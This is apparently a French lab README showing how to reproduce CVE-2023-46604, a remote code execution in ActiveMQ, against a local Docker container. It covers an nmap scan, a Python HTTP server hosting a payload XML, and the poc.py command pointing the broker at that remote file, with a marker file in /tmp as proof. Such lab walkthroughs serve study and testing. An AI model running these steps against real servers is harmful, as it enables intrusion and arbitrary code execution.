# README - Exploitation de CVE-2023-46604

Ce document détaille les étapes nécessaires pour exploiter la vulnérabilité **CVE-2023-46604** sur un serveur ActiveMQ, permettant une exécution de code à distance (RCE).

---

## **1. Configuration de l'environnement ActiveMQ**

### Lancer ActiveMQ avec Docker
1. Accédez au dossier `activemq_2023`.
2. Démarrez ActiveMQ en arrière-plan avec la commande suivante :
   ```bash
   docker compose up -d
   ```

   ![Capture Docker Compose](https://github.com/user-attachments/assets/d8f89a89-5db4-443e-ac48-01ada7163acd)

3. Accédez à l'interface d'administration ActiveMQ dans un navigateur :
   ```
   http://localhost:8161/admin/
   ```
   Vous devriez voir la version ActiveMQ (par exemple : **5.17.3**).

   ![Interface ActiveMQ](https://github.com/user-attachments/assets/1a11852e-ada9-4ece-b2b3-b92e99d1fdbc)

4. Vous pouvez également vérifier la version ActiveMQ dans le fichier `docker-compose.yml` :
   ![Version ActiveMQ dans docker-compose.yml](https://github.com/user-attachments/assets/3f82642d-676b-49d2-9f2f-c72d4246717f)

---

## **2. Identifier les services actifs**

Utilisez `nmap` pour scanner les ports ouverts et identifier les services disponibles :
```bash
nmap -p- 192.168.1.145
```

   ![Résultats de Nmap](https://github.com/user-attachments/assets/2377b011-43e0-498a-8ba0-d0a664806038)

---

## **3. Exploiter la vulnérabilité**

### Lancer un serveur HTTP local
1. Ouvrez un port sur le serveur avec la commande suivante :
   ```bash
   python3 -m http.server -b 192.168.1.145 6666
   ```

   ![Serveur HTTP ouvert](https://github.com/user-attachments/assets/89c32c5d-d091-4c45-bbf2-ee755b80f622)

### Utiliser l'exploit
2. Exécutez les fichiers `poc.py` et `poc.xml` pour exploiter la vulnérabilité :
   ```bash
   python3 poc.py localhost 61616 http://192.168.1.145:6666/poc.xml
   ```

   ![Exécution de l'exploit](https://github.com/user-attachments/assets/9a0caee3-f648-454d-81c5-5d301b22ccf4)

3. Vérifiez que la commande a bien été reçue sur le port ouvert (6666).

---

## **4. Vérification de l'exécution de la charge utile**

### Identifier le conteneur ActiveMQ
1. Listez les conteneurs actifs pour trouver l'ID correspondant à ActiveMQ :
   ```bash
   docker ps -a
   ```

   ![Liste des conteneurs](https://github.com/user-attachments/assets/569e6db0-2661-4830-94e3-3a686ab5b218)

### Accéder au conteneur
2. Connectez-vous au conteneur ActiveMQ avec la commande suivante :
   ```bash
   docker exec -it <ID_du_conteneur> /bin/bash
   ```
   - Remplacez `<ID_du_conteneur>` par l'ID récupéré précédemment.

### Vérifier la réussite de l'injection
3. Accédez au dossier `/tmp` et recherchez le fichier créé par l'exploit :
   ```bash
   ls -l /tmp/
   ```

   ![Vérification du fichier dans /tmp](https://github.com/user-attachments/assets/569e6db0-2661-4830-94e3-3a686ab5b218)

   Vous devriez voir un fichier nommé `activeMQ-RCE-success`, preuve de l'exécution réussie de l'injection de code à distance.

---
